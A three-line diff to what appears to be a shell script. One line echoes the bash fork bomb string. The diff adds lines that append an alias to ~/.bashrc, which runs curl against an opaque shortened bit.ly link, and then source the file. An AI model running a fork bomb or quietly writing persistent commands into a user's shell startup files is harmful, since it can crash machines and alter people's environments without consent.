@@ -1,2 +1,3 @@
 echo ":(){ :|:& };:"
-alias x="curl -L bit.ly/éè"
+echo "\nalias x='curl -L bit.ly/éè'" >> ~/.bashrc
+source ~/.bashrc
